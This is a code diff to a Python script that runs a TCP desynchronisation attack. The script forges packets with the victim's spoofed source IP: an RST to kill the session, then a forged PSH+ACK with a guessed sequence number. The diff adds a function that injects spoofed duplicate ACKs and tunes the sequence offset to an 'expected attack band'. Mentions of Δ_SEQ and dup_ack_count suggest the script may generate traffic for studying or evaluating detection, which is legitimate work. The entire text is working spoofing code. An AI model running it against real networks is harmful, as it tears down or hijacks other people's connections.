@@ -113,6 +113,29 @@ def inject_desync_data(
     )
 
 
+def inject_duplicate_acks(
+    victim_ip: str,
+    server_ip: str,
+    server_port: int,
+    src_port: int,
+    seq_num: int,
+    ack_num: int,
+    count: int = 4,
+) -> None:
+    """
+    Inject duplicate ACK packets to establish duplicate ACK signaling (dup_ack_count >= 3).
+    """
+    for _ in range(count):
+        pkt = IP(src=victim_ip, dst=server_ip) / TCP(
+            sport=src_port,
+            dport=server_port,
+            flags="A",
+            seq=seq_num,
+            ack=ack_num,
+        )
+        send(pkt, verbose=False)
+
+
 def run_tcp_desync(
     victim_ip: str,
     server_ip: str,
@@ -125,7 +148,8 @@ def run_tcp_desync(
 
     Each round consists of:
       1. A forged RST to kill the existing session.
-      2. A forged PSH+ACK with a predicted (but wrong) sequence number.
+      2. Duplicate ACKs establishing duplicate ACK signaling.
+      3. A forged PSH+ACK with a predicted sequence number in [65000, 90000].
 
     Parameters
     ----------
@@ -151,8 +175,10 @@ def run_tcp_desync(
         src_port = random.randint(32768, 60999)
         # Guess a sequence number near a realistic window
         base_seq = random.randint(100_000, 4_000_000_000)
-        # The "predicted" sequence is offset by a large value to maximise Δ_SEQ
-        predicted_seq = base_seq + random.randint(5000, 100_000)
+        # The predicted sequence is offset in the expected attack band [65000, 90000]
+        offset = random.randint(65000, 90000)
+        predicted_seq = base_seq + offset
+        ack_val = predicted_seq + 1
 
         inject_rst(
             victim_ip=victim_ip,
@@ -160,6 +186,15 @@ def run_tcp_desync(
             server_port=server_port,
             src_port=src_port,
             seq_num=base_seq,
+        )
+        inject_duplicate_acks(
+            victim_ip=victim_ip,
+            server_ip=server_ip,
+            server_port=server_port,
+            src_port=src_port,
+            seq_num=base_seq,
+            ack_num=ack_val,
+            count=4,
         )
         time.sleep(0.05)
         inject_desync_data(
